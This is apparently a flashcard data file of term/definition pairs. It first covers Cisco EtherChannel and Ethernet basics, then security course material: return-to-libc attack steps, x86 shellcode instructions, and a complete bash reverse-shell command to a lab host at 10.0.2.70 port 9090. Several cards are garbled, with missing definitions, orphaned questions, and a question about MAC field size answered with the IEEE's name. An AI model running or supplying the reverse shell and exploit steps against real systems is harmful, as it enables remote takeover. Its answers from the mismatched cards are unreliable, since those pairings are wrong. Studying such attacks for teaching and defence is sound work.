pairs.term: show etherchannel summary
pairs.definition: Provides an overview of all configured EtherChannels, including the logical interface status (for example, SU), the dynamic aggregation protocol, and the state of each member interface.

pairs.term: show interfaces port-channel 1
pairs.definition: Displays the logical EtherChannel interface statistics, including combined bandwidth of active member interfaces and the list of members.

pairs.term: show etherchannel port
pairs.definition: Displays detailed instances of the local configuration and information from LACP/PAgP packets for each member interface, including load values in hex.

pairs.term: show lacp neighbor
pairs.definition: Displays information about the LACP neighbor, including the neighbor's system ID, system priority, and fast or slow LACP packet intervals.

pairs.term: show lacp sys-id
pairs.definition: Displays the local LACP system identifier and priority (for example, 32768, 0062.ec9d.c500).

pairs.term: show lacp counters
pairs.definition: Displays LACP packet counters for sent/received LACPDUs, markers, and errors on each member interface; counters not incrementing indicate a problem.

prompt: Match each term to its correct definition.

pairs.term: Channel number ranges
pairs.definition: Valid channel numbers are 1 to 48 for a 3560 series switch. For a 2960 series switch with L3 capabilities, valid channel numbers are 1 to 6. The port-channel interface range is 1 to 128.

pairs.term: Port identity requirements in an EtherChannel
pairs.definition: All ports must be identical: same speed and duplex, cannot mix Fast Ethernet and Gigabit Ethernet, and cannot mix PAgP and LACP in a single EtherChannel.

pairs.term: Do local channel group numbers need to match between switches?
pairs.definition: No. Although the local channel group number does not have to match the channel group number on a neighboring switch, the numbers are often chosen to be the same for ease of management and documentation.

pairs.term: PAgP mode combinations that create a channel
pairs.definition: To create a channel in PAgP, sides must be set to Auto-Desirable or Desirable-Desirable.

pairs.term: Layer 2 vs Layer 3 in a channel group
pairs.definition: All links must be either Layer 2 or Layer 3 in a single channel group. You can have PAgP and LACP EtherChannels on the same switch, but each EtherChannel must be exclusively PAgP or LACP.

pairs.term: LACP mode combinations that create a channel
pairs.definition: To create a channel in LACP, sides must be set to Active-Active or Active-Passive.

prompt: Match each term to its correct definition.

pairs.term: On mode
pairs.definition: Forces the interface into an EtherChannel without PAgP or LACP. The channel only exists if connected to another interface group also in On mode.

pairs.term: Auto mode (PAgP)
pairs.definition: Places the interface into a passive negotiating state: it responds to PAgP packets but does not initiate PAgP negotiation.

pairs.term: Desirable mode (PAgP)
pairs.definition: Places the interface into an active negotiating state: it sends PAgP packets to start negotiations.

pairs.term: Passive mode (LACP)
pairs.definition: Places the interface into a passive negotiating state: it responds to LACP packets but does not initiate LACP negotiation.

pairs.term: Active mode (LACP)
pairs.definition: Places the interface into an active negotiating state: it sends LACP packets to start negotiations.

prompt: Match each term to its correct definition.

pairs.term: Overriding the default LACP maximum
pairs.definition: Specifying the maximum active ports (e.g. lacp max-bundle 5) leaves the remaining ports in hot-standby; if you specify 5 active ports in a channel, the remaining 11 ports become hot-standby ports.

pairs.term: Switch(config)# interface port-channel 2
pairs.definition: Enters interface configuration mode for port-channel 2. The range for port channels is 1 to 128.

pairs.term: Switch(config-if)# lacp max-bundle 3
pairs.definition: Specifies the maximum number of LACP ports in the port-channel bundle. The range is 1 to 8.

pairs.term: Switch(config-if)# port-channel min-links 3
pairs.definition: Specifies the minimum number of member ports (3 in this example) that must be link-up and bundled for the port-channel interface to transition to link-up. Range is 2 to 8.

pairs.term: Switch(config)# lacp system-priority 32000
pairs.definition: Configures the LACP system priority. Range is 1 to 65535; default is 32768. The lower the value, the higher the system priority.

pairs.term: Switch(config-if)# lacp port-priority 32000
pairs.definition: Configures the LACP port priority. Range is 1 to 65535; default is 32768. The lower the value, the more likely the port will be used for LACP transmission.

prompt: Match each term to its correct definition.

pairs.term: Switch(config-if-range)# channel-group 1 mode on
pairs.definition: Creates channel group 1 as an EtherChannel without PAgP or LACP and assigns interfaces 1 to 4 as part of it.

pairs.term: Switch(config-if-range)# channel-group 1 mode desirable
pairs.definition: Creates channel group 1 as a PAgP channel and assigns interfaces 1 to 4 as part of it.

pairs.term: Switch(config-if-range)# channel-group 1 mode active
pairs.definition: Creates channel group 1 as an LACP channel and assigns interfaces 1 to 4 as part of it.

pairs.term: Automatic port-channel creation
pairs.definition: If you enter the channel-group command in the physical port interface mode without first setting a port-channel command in global configuration mode, the port channel is automatically created for you.

pairs.term: Channel group vs port-channel number
pairs.definition: The channel group number must match the port-channel number.

pairs.term: Switch(config)# interface port-channel 1
pairs.definition: Specifies the port-channel interface and enters interface configuration mode where you can configure additional parameters.

prompt: Match each term to its correct definition.

pairs.term: L3 EtherChannel channel number on 2960 vs 3560
pairs.definition: Valid channel numbers are 1 to 48 for a 3560 series switch; for a 2960 series switch with L3 capabilities, the valid channel numbers are 1 to 6.

pairs.term: L3Switch(config)# interface port-channel 1
pairs.definition: Creates the port-channel logical interface and moves to interface config mode. Valid channel numbers are 1 to 48 for a 3560 series; 1 to 6 for a 2960 with L3 capabilities.

pairs.term: L3Switch(config-if)# no switchport
pairs.definition: Puts the interface into Layer 3 mode.

pairs.term: L3Switch(config-if)# ip address 172.16.10.1 255.255.255.0

pairs.term: L3Switch(config-if-range)# no ip address
pairs.definition: Ensures that no IP addresses are assigned on the physical interfaces of a Layer 3 EtherChannel.

pairs.term: What signal did 10BASE-T send every 16 ms when idle, which autonegotiation repurposes?
pairs.definition: A link pulse, renamed Normal Link Pulse (NLP).

pairs.term: What is a Fast Link Pulse (FLP) burst?
pairs.definition: A group of NLPs sent for the purpose of autonegotiation.

pairs.term: What voltage range does NLP signaling use?
pairs.definition: 0 to +1 volts.

pairs.term: How do link partners acknowledge receipt of the current FLP link code word?
pairs.definition: By sending at least three FLP bursts with the Acknowledge bit set.

pairs.term: After both link partners acknowledge, what happens next?
pairs.definition: They move on to the next page or enable the agreed configuration.

pairs.term: If one station autonegotiates and the other does not, what duplex does the autonegotiating station select?
pairs.definition: Half duplex.

pairs.term: How is the total size of a broadcast domain identified?
pairs.definition: By all the collision domains that process the same broadcast frame, bounded by a Layer 3 device.

pairs.term: What Layer 2 address do workstations use to broadcast?
pairs.definition: 0xFFFFFFFFFFFF.

pairs.term: What is broadcast radiation?
pairs.definition: The accumulation of broadcast and multicast traffic from each device in the network.

pairs.term: How often do typical IP workstations cache ARP addresses and for how long?
pairs.definition: 10 to 100 addresses, cached for about 2 hours.

pairs.term: What can trigger a broadcast storm?
pairs.definition: A device requesting information from a network too large, generating many responses or cascading requests.

pairs.term: How does a router forward a packet through it?
pairs.definition: Based on the destination IP address (not MAC), only if the IP is outside the local segment range and a route exists.

pairs.term: What are collision fragments also called?
pairs.definition: Runts.

pairs.term: show interfaces [interface]
pairs.definition: Displays interface statistics including collision, late collision, runts, giants, CRC, and late collision counters.

pairs.term: What does CSMA/CD stand for?
pairs.definition: Carrier Sense Multiple Access Collision Detect.

pairs.term: What does 'Carrier Sense' mean in CSMA/CD?
pairs.definition: Devices check (listen) for a carrier signal before transmitting.

pairs.term: What is the term for when two stations transmit at the same time in CSMA/CD?
pairs.definition: A collision.

pairs.term: How does a NIC detect a collision on UTP cable?
pairs.definition: By detecting a signal on the RX pair while simultaneously sending on the TX pair (half duplex only).

prompt: Match each term to its correct definition.

pairs.term: How does a station handle a late collision differently from a normal collision?
pairs.definition: A normal collision is retransmitted automatically; a late-collision frame is NOT automatically retransmitted.

pairs.term: What is a late remote collision?
pairs.definition: A late collision that occurs after slot time elapsed and on the far side of a repeater.

pairs.term: How can a late remote collision be inferred?
pairs.definition: By analyzing the last few octets of a bad frame for the jam-signal pattern; otherwise detected as an FCS error.

pairs.term: What symptom characterizes a local collision on coax (10BASE2/10BASE5)?
pairs.definition: Overlapping waveforms causing a voltage doubling/overvoltage around -1.5 volts on the coax.

pairs.term: How is a local collision detected on UTP?
pairs.definition: Simultaneous RX detection while TX is active.

pairs.term: What characterizes a remote collision?
pairs.definition: A frame under 64 octets with an invalid FCS but no overvoltage/RX+TX activity; occurs on the far side of a repeater.

prompt: Match each term to its correct definition.

pairs.term: What efficiency can full-duplex Ethernet offer?
pairs.definition: 100 percent efficiency in both directions.

pairs.term: A 100-Mbps switch in full-duplex can potentially offer how much throughput to a station?
pairs.definition: 200 Mbps.

pairs.term: Are coaxial Ethernet implementations capable of full duplex?
pairs.definition: No; they are inherently half duplex.

pairs.term: How many duplex modes exist per the chapter?
pairs.definition: Two: half and full.

pairs.term: show interfaces | include duplex
pairs.definition: Displays the negotiated or configured duplex mode of an interface.

pairs.term: Name the three ways a data channel can operate.
pairs.definition: Simplex, half-duplex, and full-duplex.

pairs.term: show interfaces [interface] | include CRC
pairs.definition: Displays CRC/FCS error counts on an interface.

pairs.term: What is a jabber transmission duration?
pairs.definition: At least 20,000 to 50,000 bit-times.

pairs.term: How do most diagnostic tools report jabber?
pairs.definition: Whenever a detected transmission exceeds the maximum legal frame size (1518 octets).

pairs.term: What is the minimum legal Ethernet frame size?
pairs.definition: 64 octets.

pairs.term: What causes an FCS error?
pairs.definition: At least 1 bit differing from what was transmitted; the recalculated checksum does not match the appended FCS.

pairs.term: What does a high number of FCS errors from a single station indicate?
pairs.definition: A faulty NIC, corrupted drivers, or a bad cable to that station.

pairs.term: At what speed did original Ethernet products transmit data?
pairs.definition: 10 Mbps over thick coaxial cable up to 2 km.

pairs.term: How has Ethernet scaled in speed from 1973 to the time of this writing?
pairs.definition: From 3 Mbps in 1973 to 10 Gbps, remaining compatible across generations.

pairs.term: Why did Ethernet grow beyond LAN to MAN/WAN boundaries?
pairs.definition: With Gigabit Ethernet its reach was extended to distances making it a metropolitan-area and wide-area standard.

pairs.term: Ethernet was first designed to address what networking problem?
pairs.definition: Allowing two or more users to share the same medium without their signals interfering with each other.

pairs.term: In what decade was Ethernet originally developed?
pairs.definition: The 1970s.

pairs.term: 10-Gb Ethernet operates at how many Mbps?
pairs.definition: 10,000 Mbps (10 Gbps).

pairs.term: Which two basic frame format features remain consistent across all Ethernet forms?
pairs.definition: The basic frame format and the IEEE sublayers of OSI Layer 2.

pairs.term: In which direction are frame format diagrams read?
pairs.definition: From left to right, like an oscilloscope graph.

pairs.term: Name the five commonly found fields of a generic data link frame.
pairs.definition: Frame Start, Address, Length/Type/Control, Data, and Frame Check Sequence (FCS).

pairs.term: In Ethernet II, what is the minimum data field size and when must padding be added?
pairs.definition: 46 octets; pad added when data is less than 46 octets to meet minimum frame size.

pairs.term: What two unique values are checked in the first four octets of data to determine 802.2 LLC encapsulation?
pairs.definition: AAAA (SNAP) and FFFF (old Novell IPX raw).

pairs.term: What does FFFF in the first four octets of data indicate?
pairs.definition: An old Novell Internetwork Packet Exchange (IPX) raw encapsulation.

pairs.term: What is the length of the Start Frame Delimiter (SFD) field?
pairs.definition: 1 octet.

How many octets is the Source MAC Address field in 802.3?

pairs.definition: The Institute of Electrical and Electronic Engineers (IEEE).

pairs.term: What is the IEEE standard number for Ethernet?
How does the IEEE divide the OSI data link layer?
pairs.definition: Into Media Access Control (MAC) and Logical Link Control (LLC) sublayers.

pairs.term: In what year did the IEEE announce the 100-Mbps Ethernet standard?
In what year were Gigabit Ethernet standards approved by the IEEE?
How are new Ethernet supplements to the 802.3 standard designated?
pairs.definition: With a one- or two-letter designation (e.g., 802.3u is Fast Ethernet).

pairs.term: What does MAC stand for?
pairs.definition: Media Access Control.

pairs.term: How many sublayers of Layer 2 do MAC and LLC comprise?
pairs.definition: Two: MAC and LLC, both sublayers of the data link layer.

pairs.term: Which technologies use deterministic MAC?
pairs.definition: Token Ring and FDDI.

pairs.term: Which technology uses nondeterministic (probabilistic) MAC?
pairs.definition: Ethernet / 802.3.

pairs.term: show mac address-table
pairs.definition: Displays the MAC address table (CAM table) of learned MAC addresses on a switch.

pairs.term: show mac address-table dynamic
pairs.definition: Displays dynamically learned MAC addresses in the switch forwarding table.

pairs.term: How long is a MAC address in bits?
pairs.definition: 48 bits.

pairs.term: How is a MAC address expressed in hexadecimal?
pairs.definition: As 12 hexadecimal digits.

pairs.term: What is the OUI in a MAC address?
pairs.definition: The first 24 bits (6 hex digits) administered by the IEEE to identify the manufacturer/vendor.

pairs.term: Why are MAC addresses sometimes called burned-in addresses?
pairs.definition: Because they are burned into ROM and copied to RAM when the NIC initializes.

pairs.term: show spanning-tree
pairs.definition: Displays Spanning Tree Protocol status (introduced for loop prevention on switched networks).

pairs.term: What is a hub's relationship to repeaters?
pairs.definition: Hubs are multiport repeaters/repeating hubs.

pairs.term: What is the four-repeater rule in Ethernet?
pairs.definition: No more than four repeaters or repeating hubs can exist between any two computers.

pairs.term: Which devices keep track of MAC addresses and which segment each is on?
pairs.definition: Layer 2 bridges and switches.

pairs.term: What does a bridge create regarding collision domains?
pairs.definition: Multiple collision domains but only one broadcast domain.

pairs.term: What does a router create regarding domains?
pairs.definition: Multiple collision domains and multiple broadcast domains.

pairs.term: At which OSI layers does Ethernet operate?
pairs.definition: Ethernet operates at the data link layer and the physical layer. Ethernet standards define both the Layer 2 protocols and the Layer 1 technologies, operating at the LLC and MAC sublayers of the data link layer.

pairs.term: Legacy Ethernet media access
pairs.definition: Legacy Ethernet using a bus topology or hubs is a shared, half-duplex medium. Ethernet over a half-duplex medium uses the contention-based access method CSMA/CD to ensure that only one device is transmitting at a time.

pairs.term: Which IEEE standards use the MAC sublayer?
pairs.definition: The MAC sublayer is specified in IEEE 802.3, 802.11, and 802.15. IEEE 802 LAN/MAN protocols, including Ethernet, use the LLC and MAC sublayers of the data link layer.

pairs.term: What is a collision in the context of CSMA/CD?
pairs.definition: A collision occurs when more than one device attempts to transmit simultaneously on a shared half-duplex medium. CSMA/CD detects the collision and provides a back-off algorithm for retransmission.

pairs.term: What role does the LLC sublayer play for multiple Layer 3 protocols?
pairs.definition: The LLC sublayer places information in the frame to identify which network layer protocol is being used. This allows multiple Layer 3 protocols, such as IPv4 and IPv6, to use the same network interface and media.

prompt: Match each term to its correct definition.

pairs.term: Why was the Extension field added for 1000 Mbps Ethernet?
pairs.definition: To stretch minimum-size 64-octet frames long enough to meet slot-time requirements in half duplex.

pairs.term: When is the Extension field present?
pairs.definition: Only on 1000 Mbps half-duplex links; received by the station and discarded.

pairs.term: Why are collisions impossible to be legal in 10-Gb Ethernet?
pairs.definition: 10-Gb Ethernet does not permit half-duplex operation.

pairs.term: What is slot time?
pairs.definition: Just longer than the longest possible round-trip delay across the largest legal collision domain.

pairs.term: Slot time for 1000 Mbps Ethernet is?
pairs.definition: 4096 bit-times (512 octets including the Extension field).

pairs.term: Is slot time defined for 10 Gbps Ethernet?
pairs.definition: No; 10-Gb Ethernet does not permit half-duplex operation.

prompt: Match each term to its correct definition.

pairs.term: Ethernet MAC address
pairs.definition: An Ethernet MAC address is a 48-bit address expressed using 12 hexadecimal digits. Because 1 byte equals 8 bits, a MAC address is 6 bytes in length. It is used to identify the physical source and destination devices (NICs) on the local network segment.

pairs.term: What is the purpose of MAC addressing?
pairs.definition: In an Ethernet LAN, the MAC address is used to identify the physical source and destination devices (NICs) on the local network segment. MAC addressing provides a method for device identification at the data link layer of the OSI model.

pairs.term: Structure of an Ethernet MAC address
pairs.definition: An Ethernet MAC address consists of a 6-digit hexadecimal vendor OUI code followed by a 6-digit hexadecimal vendor-assigned value. For example, with Cisco OUI 00-60-2F and vendor code 3A-07-BC, the MAC address would be 00-60-2F-3A-07-BC.

pairs.term: What must a vendor do when assigning a MAC address to a device?
pairs.definition: The vendor must use its assigned OUI as the first 6 hexadecimal digits and assign a unique value in the last 6 hexadecimal digits. It is the responsibility of the vendor to ensure that no two of its devices are assigned the same MAC address.

pairs.term: Who assigns the OUI and where is it obtained?
pairs.definition: Every vendor that sells Ethernet devices must register with the IEEE to obtain a unique 6-digit hexadecimal (24-bit or 3-byte) code called an organizationally unique identifier (OUI).

pairs.term: Why is filtering traffic based on MAC address no longer as secure as it once was?
pairs.definition: With modern PC operating systems and NICs, it is possible to change the MAC address in software. This is useful when attempting to gain access to a network that filters based on BIA, so MAC-based filtering is no longer as secure as it once was.

prompt: Match each term to its correct definition.

pairs.term: Why is hexadecimal used to represent an Ethernet MAC address?
pairs.definition: A single hexadecimal digit represents 4 binary bits. Therefore, a 48-bit Ethernet MAC address can be expressed using only 12 hexadecimal values. When using hexadecimal, leading zeros are always displayed to complete the 8-bit (2 hex digit) representation.

pairs.term: How many bits does one hexadecimal digit represent?
pairs.definition: A single hexadecimal digit represents 4 binary bits. Therefore, the 8-bit binary range 00000000 to 11111111 can be represented in hexadecimal as the range 00 to FF, and a 48-bit Ethernet MAC address can be expressed using only 12 hexadecimal values.

pairs.term: Hexadecimal notation alternatives
pairs.definition: Hexadecimal numbers may be represented by a value preceded by 0x (for example, 0x73), by using a subscript 16, or by using the hex number followed by an H (for example, 73H).

pairs.term: How do you convert between decimal and hexadecimal values?
pairs.definition: Convert the decimal or hexadecimal value to binary, and then convert the binary value to either decimal or hexadecimal as appropriate. This conversion is covered in detail in Chapter 5, Number Systems.

prompt: Match each term to its correct definition.

pairs.term: How are multicast frames handled by switches and routers?
pairs.definition: Multicast frames are flooded out all Ethernet switch ports except the incoming port, unless the switch is configured for multicast snooping. They are not forwarded by a router unless the router is configured to route multicast packets.

pairs.term: What is a host group?
pairs.definition: A multicast address represents a group of addresses, sometimes called a host group. Because it represents a group, a multicast address can only be used as the destination of a packet; the source is always a unicast address.

pairs.term: Other reserved multicast destination MAC addresses
pairs.definition: There are other reserved multicast destination MAC addresses for when the encapsulated data is not IP, such as Spanning Tree Protocol (STP) and Link Layer Discovery Protocol (LLDP).

pairs.term: What is the relationship between a multicast IP address and a multicast MAC address?
pairs.definition: A multicast IP address requires a corresponding multicast MAC address to deliver frames on a local network. The multicast MAC address is associated with, and uses addressing information from, the IPv4 or IPv6 multicast address.

pairs.term: Which protocols and applications use multicast addressing?
pairs.definition: Routing protocols and other network protocols use multicast addressing. Applications such as video and imaging software may also use multicast addressing, although multicast applications are not as common.

pairs.term: What is the IPv6 multicast MAC address prefix?
pairs.definition: The Ethernet multicast frame has destination MAC address 33-33 when the encapsulated data is an IPv6 multicast packet.

prompt: Match each term to its correct definition.

pairs.term: Type/Length (EtherType) field
pairs.definition: This 2-byte field identifies the upper-layer protocol encapsulated in the Ethernet frame. Common hexadecimal values are 0x800 for IPv4, 0x86DD for IPv6, and 0x806 for ARP. It may also be referred to as EtherType, Type, or Length.

pairs.term: Cyclic Redundancy Check (CRC)
pairs.definition: A mathematical formula based on the number of bits (1s) in the frame, used by the FCS to determine whether a received frame has an error. The sending device includes the results of a CRC in the FCS field of the frame.

pairs.term: Which fields are included when describing the size of an Ethernet frame?
pairs.definition: The frame size includes all bytes from the destination MAC address field through the FCS field. The Preamble field is not included when describing the size of a frame.

pairs.term: Ethernet frame field order
pairs.definition: The Ethernet frame fields, in order, are: Preamble and Start Frame Delimiter, Destination MAC Address, Source MAC Address, Type/Length (EtherType), Data, and Frame Check Sequence (FCS).

pairs.term: Ethernet frame field sizes
pairs.definition: Preamble is 7 bytes, SFD is 1 byte, Destination MAC is 6 bytes, Source MAC is 6 bytes, Type/Length is 2 bytes, Data is 46 to 1500 bytes, and FCS is 4 bytes.

pairs.term: What determines whether a frame is accepted by a receiving device?
pairs.definition: The destination MAC address in a frame is compared to the MAC address in the device. If there is a match, the device accepts the frame. The destination MAC address can be a unicast, multicast, or broadcast address.

pairs.term: Why is the MYSHELL environment variable used instead of placing '/bin/sh' directly in the overflowed buffer?
pairs.definition: Placing the string in the buffer is possible but requires computing its exact in-buffer address; the environment variable approach lets a helper program print the precise address, and the string is already present in the victim's memory.

pairs.term: Why does the program name length affect the address of the MYSHELL environment variable?
pairs.definition: Environment variables are stored on the stack, but before they are pushed the program's name is pushed first. Therefore, changing the length of the program name shifts the memory locations of the environment variables.

pairs.term: Why must the helper program (env55) have exactly the same name length as the target program stack when finding the /bin/sh address?
pairs.definition: The address of the MYSHELL environment variable differs between programs with different name lengths. If the lengths differ, the address obtained is not the address of '/bin/sh' in the victim process, and the attack fails.

pairs.term: Why is an empty badfile needed before running gdb on the vulnerable program?
pairs.definition: The program's main() opens badfile and reads up to 300 bytes; if the file does not exist, fopen fails and the program crashes before breakpoints/function queries can be used.

pairs.term: export MYSHELL="/bin/sh"
pairs.definition: Exports an environment variable containing the '/bin/sh' command string, which is inherited by the child vulnerable process and whose address becomes the system() argument.

pairs.term: mv env55 env7777
pairs.definition: Renames the helper binary, demonstrating that changing program-name length shifts the environment variable addresses (used to show why name length must match the victim).

pairs.term: Where is a function's return address stored relative to its frame pointer in a normal frame?

pairs.term: What is the purpose of exit() in the basic layout beyond graceful termination?

pairs.term: What does 'p/d 0xbfffeae8 - 0xbfffea7c' compute inside gdb?

pairs.term: Why is guessing the injected code's address feasible when countermeasures are off?
pairs.definition: Two facts make the search space small: 1) Most OSes place the stack at a fixed starting virtual address; 2) Most programs have shallow stacks (short call chains). Combined, the search space is much smaller than 2^32.

prompt: Match each term to its correct definition.

pairs.term: What is the function prologue on IA-32 (32-bit x86)?
pairs.definition: The code at the beginning of a function that prepares the stack and registers. It consists of three instructions: pushl %ebp (save caller's frame pointer), movl %esp, %ebp (set callee's frame pointer), and subl $N, %esp (save space for local variables).

pairs.term: What do the built-in x86 instructions enter and leave do?
pairs.definition: enter performs the function prologue, while leave performs the first two instructions of the function epilogue (movl %ebp,%esp and popl %ebp).

pairs.term: Where does a function access its first argument on IA-32?
pairs.definition: The first argument of a function is at ebp + 8. Whenever a function needs its first argument it uses ebp+8 as the address of that argument.

pairs.term: What does the call instruction do in a function invocation?
pairs.definition: The call instruction pushes the value of the EIP register (the address of the next instruction to execute) onto the stack, then jumps to the called function. The pushed value is the return address (RA) at the top of the callee's stack frame.

pairs.term: What is the frame pointer register and what does it point to?
pairs.definition: The frame pointer register (ebp on x86) is a reference pointer used by functions to access their arguments and local variables. It always points to the memory where the old (caller's) frame pointer is stored.

prompt: Match each term to its correct definition.

pairs.term: In the leaveret-based frame construction, what pieces are placed in each chained function's stack frame?
pairs.definition: The next ebp value, the function's (or leaveret's) return address, and the function's arguments. The frames are spaced 0x20 bytes apart, and the gap beyond the used 12 bytes (next ebp, ret, arg) is filled with padding.

pairs.term: Why does the first chained function's stack frame sit at X + 4 + 0x20 when foo()'s frame pointer is X?
pairs.definition: Because returning through the leaveret adds 4 to the frame pointer (Observation 5.3 gives Y+4), plus the 0x20-byte spacing between frames chosen for the chain.

pairs.term: Why is the spacing Y-X = 0x20 (32 bytes) chosen between chained stack frames?
pairs.definition: 32 bytes of space is enough to hold the next-ebp, return address, and up to (32-8)/4 = 6 arguments per frame. If more arguments are needed, the distance can be increased; the exact value also lets attackers avoid zero bytes.

pairs.term: What argument does chain_witharg.py pass to the chained baz() calls?
pairs.definition: 0xAABBCCDD, placed right after the return address field. The experiment shows the argument value is correctly received each time, proving the argument-passing frame layout works.

pairs.term: Why is the program compiled with -g to measure the ebp-to-buffer distance?
pairs.definition: The -g option adds debug information so gdb can resolve symbols and variables; with it we can set a breakpoint at foo, print $ebp and &buffer, and compute the distance (108 bytes).

pairs.term: What result demonstrates that chaining 20 printf() calls worked in chain_printf.py?
pairs.definition: The string '/bin/sh' is printed out 20 times in a row when stack_rop runs, confirming each chained printf() call executed with the /bin/sh string as its argument.

prompt: Match each term to its correct definition.

pairs.term: Observation 5.1: what happens to the frame pointer when returning to a function's entry point?
pairs.definition: Assume function A()'s return address field contains the address of the entry point of function B(), and A()'s frame pointer points to address X. After the program returns to B() from A(), the frame pointer will point to address X+4.

pairs.term: Observation 5.3: what happens to the frame pointer when returning to function B() from A() via a leaveret?
pairs.definition: Initially inside A() with frame pointer X+4, after returning to B() via a leaveret the frame pointer points to Y+4, where Y is the value obtained from address X+4 (the location A()'s frame pointer points to).

pairs.term: In the basic return-to-libc attack, what is the main challenge (Task C)?
pairs.definition: Placing the address of '/bin/sh' on the stack at exactly the right location so that when control enters system(), system() reads it as its first argument at ebp+8. It requires tracing foo()'s epilogue and system()'s prologue to predict ebp.

pairs.term: Why should we track the %esp register rather than %ebp after foo()'s epilogue?
pairs.definition: Right after foo()'s epilogue, %ebp's value does not matter because it will soon be replaced by %esp's value inside system()'s prologue. %esp points right above where the return address was stored, which determines where the argument must go.

pairs.term: In the basic attack, why is the '/bin/sh' argument placed at buffer offset 120 (ebp+12 of the system() frame)?
pairs.definition: After foo()'s epilogue and system()'s prologue, system()'s frame pointer is 4 bytes above foo()'s old ebp; system()'s first argument is at ebp+8, i.e., 108 (ebp-buffer) + 4 + 8 = 120 bytes from the buffer start.

pairs.term: In the register-tracking table, what does the prologue instruction 'push ebp' do to esp and ebp?
pairs.definition: esp decreases by 4 (it pushes the old ebp value); ebp is unchanged. The instruction saves the caller's frame pointer so it can be restored at the end of the function.

prompt: Match each term to its correct definition.

pairs.term: What is the system() function in libc and why is it useful to attackers?
pairs.definition: system() takes a string as its argument, treats the string as a command, and executes it. An attacker can jump to system() and pass it the address of the string '/bin/sh' to spawn a shell without writing shellcode.

pairs.term: What is libc?
pairs.definition: The standard C library on Linux, a dynamically linked library. Because most programs use its functions, the OS loads libc into memory before the program runs, providing attackers with plenty of existing code to jump to.

pairs.term: Why is system() described as the easiest libc function for a return-to-libc attack?
pairs.definition: Because it takes a single string argument and executes it as a command, so the attacker only needs to jump to system() and supply the address of an existing '/bin/sh' string - no shellcode is needed.

pairs.term: What does system(cmd) actually do when invoked?
pairs.definition: system(cmd) does not execute cmd directly; it invokes /bin/sh and then uses this shell program to execute cmd. Hence dash's privilege-drop behavior affects whether a Set-UID process gets a root shell.

pairs.term: What are the three tasks of the basic return-to-libc attack?
pairs.definition: Task A: find the address of system(); Task B: find the address of the '/bin/sh' string; Task C: place that string address as system()'s argument at the correct stack position.

prompt: Match each term to its correct definition.

pairs.term: What is /dev/tcp/<host>/<port>?
pairs.definition: A bash device that, when used in a redirection (e.g. > /dev/tcp/10.0.2.70/9090), opens a TCP connection to the specified host and port, redirecting output over that connection.

pairs.term: What does the -i option of /bin/bash mean?
pairs.definition: -i stands for interactive, meaning the shell must be interactive (must provide a shell prompt).

pairs.term: What do file descriptors 0, 1, 2 represent, and what does '0<&1 2>&1' do?
pairs.definition: fd0=stdin, fd1=stdout, fd2=stderr. '0<&1' makes the shell read input from the same TCP connection that stdout is redirected to; '2>&1' redirects stderr to stdout (the TCP connection). Together the shell's input/output/error all go over the TCP connection.

pairs.term: What command triggers a reverse shell to an attacker listening on port 9090?
pairs.definition: /bin/bash -i > /dev/tcp/10.0.2.70/9090 0<&1 2>&1. It starts an interactive bash on the server whose input comes from and output goes to a TCP connection to 10.0.2.70 port 9090.

pairs.term: How is the reverse shell verified after connection?
pairs.definition: The attacker types the id command; its output shows uid=33(www-data), confirming the shell prompt corresponds to the bash process triggered by the CGI program running as www-data.

pairs.term: Why does the reverse-shell bash print 'cannot set terminal process group' / 'no job control'?
pairs.definition: Because the shell's stdin/stdout are redirected to a TCP socket rather than a terminal, so it cannot set up job control. This is expected and does not prevent command execution over the connection.

prompt: Match each term to its correct definition.

pairs.term: Goal of a reverse shell
pairs.definition: To have the shell program on the victim machine take inputs from the attacker's machine (attack machine) and print out results also to the attacker's machine.

pairs.term: Main idea behind the reverse shell
pairs.definition: Redirect the shell program's standard input and output to the attacker's machine (typically over a TCP connection), so the shell reads commands from the attacker and sends results back.

pairs.term: Reverse shell
pairs.definition: A shell program running on a victim (server) machine whose standard input comes from and standard output goes to the attacker's machine, so attackers can type commands remotely and see the results on their own machine.

pairs.term: Why attackers want a backdoor/shell instead of running one command
pairs.definition: Attackers are typically not interested in running just one command; they use the injected code to open a backdoor to the victim computer so they can run as many commands as they want.

pairs.term: The problem with a plain shell running on the victim machine
pairs.definition: The shell program only takes inputs from its own host machine and prints output to that machine, so even if attackers get the shell to run, they cannot feed it commands or see results from their own machine.

prompt: Match each term to its correct definition.

pairs.term: Why 0<&1 redirects input to the same TCP connection
pairs.definition: Since the standard output has already been redirected to the TCP connection, file descriptor 1 now represents the TCP connection. Redirecting stdin with 0<&1 makes the shell read from that same connection.

pairs.term: Which device bash prints its shell prompt to
pairs.definition: bash prints out its shell prompt to the standard error device, not the standard output device. That is why the prompt still shows up on the server machine until stderr is redirected.

pairs.term: Complete reverse shell command
pairs.definition: /bin/bash -i > /dev/tcp/10.0.2.70/9090 0<&1 2>&1 redirects standard input, output, and error to the TCP connection, giving the attacker complete control over the shell running on the victim machine.

pairs.term: Why using two /dev/tcp redirections fails
pairs.definition: /bin/bash -i > /dev/tcp/10.0.2.70/9090 < /dev/tcp/10.0.2.70/9090 makes TWO connections to the attacker's port 9090. The nc command can only take one connection, so the command fails.

pairs.term: Workaround using two netcat servers
pairs.definition: Running two 'nc -lv' servers (e.g., ports 9090 and 9091) lets you redirect output to the 9090 server and input to the 9091 server. It works, but you end up typing commands in one window while seeing output in another.

pairs.term: Behavior after both stdin and stdout are redirected to the TCP connection
pairs.definition: Commands typed on the server machine are sent over the TCP connection to the shell process, executed there, and the results are sent back to the TCP server (because the standard output is also redirected).

prompt: Match each term to its correct definition.

pairs.term: How is the name[] argument array constructed and how is %ecx set?
pairs.definition: pushl %eax (pushing the zero for name[1]), then pushl %ebx (the /bin/sh string address for name[0]), then 'movl %esp, %ecx' saves the array address into %ecx.

pairs.term: What does the cdq instruction do in the shellcode?
pairs.definition: cdq copies the sign bit (bit 31) of %eax (which is 0) into every bit position of %edx, setting %edx to zero. It is a one-byte instruction used to zero %edx with a smaller code size than a separate xorl.

pairs.term: What does 'int $0x80' do?
pairs.definition: The int instruction means interrupt. int $0x80 transfers program flow to the interrupt handler, switching to kernel mode and invoking the system call handler (it triggers the system call selected by %eax).

pairs.term: What does '%al' represent?
pairs.definition: The lower 8 bits of the %eax register. 'movb $0x0b, %al' sets %al to 11; the other bits of %eax were already zeroed by the initial xorl, so the full %eax becomes 11.

pairs.term: Shellcode
pairs.definition: The initial code injected into the victim computer during an attack (e.g., buffer overflow, format string, session hijacking); its main purpose is to start a shell program on the victim computer.

pairs.term: How does the stack pointer change when the vulnerable function returns?
